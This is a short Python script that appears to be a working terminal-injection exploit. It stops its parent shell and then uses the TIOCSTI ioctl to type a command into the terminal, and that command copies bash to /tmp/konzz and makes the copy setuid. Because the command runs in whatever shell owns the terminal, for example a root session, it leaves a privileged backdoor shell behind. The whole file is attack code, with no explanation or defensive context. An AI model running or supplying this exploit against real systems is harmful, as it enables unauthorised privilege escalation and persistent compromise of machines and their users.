#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

command = "/usr/bin/cp /usr/bin/bash /tmp/konzz;/usr/bin/chmod +s /tmp/konzz"

for char in command + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
